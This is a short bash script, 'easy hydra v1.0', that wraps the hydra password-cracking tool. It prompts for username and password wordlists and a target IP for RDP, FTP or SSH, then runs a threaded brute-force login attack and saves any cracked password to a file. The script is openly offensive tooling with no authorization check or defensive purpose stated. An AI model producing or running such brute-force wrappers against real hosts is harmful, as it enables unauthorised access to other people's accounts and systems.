#! /bin/bash
# easy hydra v1.0
#coded by : ridhi128
clear
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩
echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"
read -p "Enter the LOGIN list: " login
clear
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩
echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"
read -p "Enter the PASSWORD list: " path
clear
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩
echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"

echo "<rdp://ip> or <ftp://ip> or <ip ssh>"
read -p "Enter the IP: " ip
clear
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩
echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"

read -p "enter the file name for output: " file
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩
echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"

echo "hydra -t 5  -f -L $login -P $path $ip "
hydra -t 5 -f -L $login -P $path $ip > $file.txt
clear 
echo  ╔═╗╔═╗╔═╗╦ ╦  
echo  ║╣ ╠═╣╚═╗╚╦╝  
echo  ╚═╝╩ ╩╚═╝ ╩   
echo ╦ ╦╦ ╦╔╦╗╦═╗╔═╗
echo ╠═╣╚╦╝ ║║╠╦╝╠═╣
echo ╩ ╩ ╩ ═╩╝╩╚═╩ ╩

echo              version 1.0
printf " \e[1;77m v1.0 coded by https://github.com/ridhinva/easy-hydra\e[0m \n"

echo "attack finished for $ip "
echo "PASSWORD SAVED IN $file.txt"
